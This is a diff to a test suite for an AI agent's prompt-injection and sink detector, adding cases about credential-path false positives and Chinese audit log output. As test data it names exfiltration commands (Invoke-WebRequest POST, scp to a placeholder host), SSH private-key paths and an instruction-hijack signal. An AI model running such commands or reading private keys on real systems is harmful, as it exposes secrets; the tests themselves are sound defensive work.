@@ -18,6 +18,9 @@ describe('injection detector', () => {
   it('recognizes common alternate network exfiltration tools', () => { expect(classifySink('pwsh', 'Invoke-WebRequest https://example.invalid -Method POST').map(s => s.type)).toContain('network'); expect(classifySink('scp', 'fake.txt user@example.invalid:/tmp').map(s => s.type)).toContain('network') })
   it('fails closed on unserializable arguments without throwing', () => { const circular: Record<string, unknown> = {}; circular.self = circular; expect(() => classifySink('tool', circular)).not.toThrow() })
   it('does not classify ordinary credential-related documentation as a secret sink', () => { expect(classifySink('filesystem.read', { path: 'docs/password-reset-guide.md' }).map(s => s.type)).not.toContain('credential-access'); expect(detectInjection('This document explains password and token rotation.')).not.toContainEqual(expect.objectContaining({ type: 'secret-access' })) })
+  it('does not classify a test fixture filename containing credential as a secret sink', () => { expect(classifySink('read', { file_path: 'malicious-repo/credential-read.md' }).map(s => s.type)).not.toContain('credential-access') })
+  it('does not classify a question quoting a credential path as credential access', () => { expect(classifySink('ask_user_question', { question: 'Should I read fixtures/.ssh/id_rsa?' }).map(s => s.type)).not.toContain('credential-access') })
+  it('does not classify glob patterns containing a credential path as credential access', () => { expect(classifySink('glob', { pattern: 'fixtures/.ssh/**' }).map(s => s.type)).not.toContain('credential-access') })
   it('classifies Windows absolute SSH private-key paths as credential access', () => { expect(classifySink('read', { path: 'C:\\Users\\李现\\.ssh\\id_rsa' }).map(s => s.type)).toContain('credential-access') })
   it('survives hostile and malformed argument values', () => {
     const throwing = { toJSON() { throw new Error('boom') }, toString() { throw new Error('boom') } }
@@ -58,5 +61,10 @@ describe('audit log', () => {
     const log = formatAuditLog('tool\nforged-entry', 'safe', { agentId: 'a', hasUntrustedContext: true, sources: [{ label: 'README\nforged: true', trust: 'UNTRUSTED' }], injectionSignals: [{ type: 'instruction-hijack', severity: 'high', evidence: 'ignore\nforged' }], contextRiskScore: 20 }, [{ type: 'network', evidence: 'https://' }], { score: 90, level: 'CRITICAL', decision: 'BLOCK', reasons: [] })
     expect(log).not.toContain('README\nforged')
     expect(log).toContain('untrusted: README forged: true')
+  })
+  it('supports Chinese audit decisions while retaining the machine-readable BLOCKED marker', () => {
+    const log = formatAuditLog('read', { file_path: 'C:\\fake\\.ssh\\id_rsa' }, { agentId: 'a', hasUntrustedContext: true, sources: [{ label: 'README.md', trust: 'UNTRUSTED' }], injectionSignals: [], contextRiskScore: 20 }, [{ type: 'credential-access', evidence: '.ssh' }], { score: 90, level: 'CRITICAL', decision: 'BLOCK', reasons: [] }, 'zh-CN')
+    expect(log).toContain('DSH 注入防护')
+    expect(log).toContain('已阻断（BLOCKED）')
   })
 })
